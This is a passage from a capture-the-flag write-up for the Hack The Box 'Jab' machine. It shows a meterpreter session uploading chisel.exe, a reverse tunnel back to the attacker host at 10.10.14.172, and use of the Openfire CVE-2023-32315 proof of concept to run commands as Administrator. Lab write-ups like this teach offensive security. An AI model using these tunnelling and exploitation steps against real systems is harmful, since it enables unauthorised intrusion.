</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    --&gt;</span>  
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;connectionProvider&gt;</span> 
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;className&gt;</span>org.jivesoftware.database.EmbeddedConnectionProvider<span style="color:#f92672">&lt;/className&gt;</span> 
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;/connectionProvider&gt;</span>  
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;setup&gt;</span>true<span style="color:#f92672">&lt;/setup&gt;</span>  
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;fqdn&gt;</span>dc01.jab.htb<span style="color:#f92672">&lt;/fqdn&gt;</span> 
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/jive&gt;</span>
</span></span></code></pre></div><p>Now let&rsquo;s use <code>chisel</code> to gain access to this port.  First, I&rsquo;ll get the server running on my attacker machine.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿shattersec<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/jab<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ chisel server --port <span style="color:#ae81ff">8000</span> --reverse
</span></span><span style="display:flex;"><span>2025/02/05 16:06:20 server: Reverse tunnelling enabled
</span></span><span style="display:flex;"><span>2025/02/05 16:06:20 server: Fingerprint XpMEJtbc5GnbG6m4Nyu2B4o2VgiPyDx6/STOki3XCkE<span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>2025/02/05 16:06:20 server: Listening on http://0.0.0.0:8000
</span></span></code></pre></div><p>Next, let&rsquo;s upload the binary to the victim machine and connect to our server.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>meterpreter &gt; upload chisel.exe
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Uploading  : /home/pl4stic/htb/jab/chisel.exe -&gt; chisel.exe
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Uploaded 8.00 MiB of 8.78 MiB <span style="color:#f92672">(</span>91.1%<span style="color:#f92672">)</span>: /home/pl4stic/htb/jab/chisel.exe -&gt; chisel.exe
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Uploaded 8.78 MiB of 8.78 MiB <span style="color:#f92672">(</span>100.0%<span style="color:#f92672">)</span>: /home/pl4stic/htb/jab/chisel.exe -&gt; chisel.exe
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Completed  : /home/pl4stic/htb/jab/chisel.exe -&gt; chisel.exe
</span></span><span style="display:flex;"><span>meterpreter &gt; shell
</span></span><span style="display:flex;"><span>Process <span style="color:#ae81ff">5656</span> created.
</span></span><span style="display:flex;"><span>Channel <span style="color:#ae81ff">8</span> created.
</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">[</span>Version 10.0.17763.5458<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2018</span> Microsoft Corporation. All rights reserved.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>vc_openfire&gt;.<span style="color:#ae81ff">\c</span>hisel.exe client 10.10.14.172:8000 R:9090:localhost:9090
</span></span><span style="display:flex;"><span>.<span style="color:#ae81ff">\c</span>hisel.exe client 10.10.14.172:8000 R:9090:localhost:9090
</span></span><span style="display:flex;"><span>2025/02/05 16:08:29 client: Connecting to ws://10.10.14.172:8000
</span></span><span style="display:flex;"><span>2025/02/05 16:08:29 client: Connected <span style="color:#f92672">(</span>Latency 20.0236ms<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>And now we&rsquo;ve got access on our local machine.</p>
<p><img src="/images/jab10.png" alt="jab10"></p>
<p>Also, lucky for us, the <code>svc_openfire</code> credentials from earlier work on the admin console.</p>
<h3 id="cve-2023-32315">CVE-2023-32315</h3>
<p>Doing some additional research shows OpenFire v4.7.5 might be vulnerable to <a href="https://www.vicarius.io/vsociety/posts/cve-2023-32315-path-traversal-in-openfire-leads-to-rce" target="_blank">CVE-2023-32315</a> and exploit POC <a href="https://github.com/miko550/CVE-2023-32315" target="_blank">here</a>.  Luckily, <code>svc_openfire</code> has administrator privileges on OpenFire, so we can omit the first few steps in the POC.</p>
<p><img src="/images/jab11.png" alt="jab11"></p>
<p>Once the <code>.jar</code> is uploaded, follow the steps from the POC and run whatever commands you like as Administrator. Grab the root flag.</p>
  
  <hr>
<div class="footer">
    
	    
            <a class="previous-post" href="https://pL4sTiC1337.github.io/writeups/htb-hospital/?ref=footer"><span style="font-weight:bold;">« Previous</span><br>HtB Hospital</a>
        
	    
            <div class="next-post">
                <a href="https://pL4sTiC1337.github.io/writeups/htb-faculty/?ref=footer"><span style="font-weight:bold;">Next »</span><br>HtB Faculty</a>
            </div>
        
    
</div>

  
</div>
            </main>
            
  
    <div class="article-toc ">
    <div class="toc-wrapper">
      <h4 id="contents"></h4>
      <nav id="TableOfContents">
  <ul>
    <li><a href="#scanning">Scanning</a>
      <ul>
        <li><a href="#nmap">nmap</a></li>
        <li><a href="#xmpp---5269-5270-tcp">XMPP - 5269, 5270 (tcp)</a></li>
        <li><a href="#openfire---7070-7443-tcp">Openfire - 7070, 7443 (tcp)</a></li>
      </ul>
    </li>
    <li><a href="#initial-access">Initial Access</a>
      <ul>
        <li><a href="#kerberoasting">Kerberoasting</a></li>
        <li><a href="#back-to-xmpp">Back to XMPP</a></li>
        <li><a href="#bloodhound-enumeration">Bloodhound Enumeration</a></li>
        <li><a href="#dcom">DCOM</a></li>
      </ul>
    </li>
    <li><a href="#privilege-escalation">Privilege Escalation</a>
      <ul>
        <li><a href="#openfire-admin-console">OpenFire Admin Console</a></li>
        <li><a href="#cve-2023-32315">CVE-2023-32315</a></li>
      </ul>
    </li>
  </ul>
</nav>
    </div>
</div>

  

        </div>
    </body>
</html>
